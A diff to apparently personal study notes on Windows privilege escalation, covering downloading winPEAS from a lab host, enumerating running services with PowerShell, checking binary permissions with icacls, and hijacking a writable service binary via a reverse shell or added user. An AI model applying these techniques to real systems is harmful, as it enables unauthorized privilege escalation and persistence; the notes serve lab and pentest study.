@@ -60,17 +60,19 @@
 ### Winpeas (may be info not correct)
 - Get file from remote ``` iwr -uri http://192.168.118.2/winPEASx64.exe -Outfile winPEAS.exe ```
   
-# Hijack window service
+# Hijack window service [Careful which service is running!!!!]
 - Target find some exe origin is from that user and able to modify
 - If want to modify exe, better backup one first! e.g. ``` move .\Pictures\BackendCacheCleanup.exe BackendCacheCleanup.exe.bak ```
 - Can use rev shell / add user with powershell command (2 approach)
 ## Sevice binary
+1. 
 - May require RDP to use
 - ``` Get-CimInstance -ClassName win32_service | Select Name,State,PathName | Where-Object {$_.State -like 'Running'} ``` get WMI (Windows Management Instrumentation)services and see starting path
 - Search services: ``` Get-CimInstance -ClassName Win32_Service -Filter "Name like 'FJTWSVIC'" | Select-Object Name, PathName, StartName, State ```
 - [Powershell]: ```  Get-Service ```
 - check if have customed path ``` --default-files```
 - [*Useful*] Check permission with ``` icacls {path} ```
+- https://learn.microsoft.com/zh-tw/windows-server/administration/windows-commands/icacls
 - Mask 	Permissions
     F 	Full access
     M 	Modify access
